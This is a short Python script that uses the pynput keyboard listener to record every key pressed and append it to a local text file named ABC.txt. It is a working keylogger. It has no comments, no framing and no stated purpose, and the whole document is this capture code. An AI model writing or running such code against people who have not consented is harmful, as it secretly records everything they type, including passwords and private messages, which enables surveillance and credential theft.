from pynput.keyboard import Listener

def write_to_file(key):
    key = str(key).replace("'", "")
    with open("ABC.txt", "a") as f:
        f.write(key + "")
        
def on_press(key):
    write_to_file(key)
    
with Listener(on_press=on_press) as Listener:
    Listener.join()
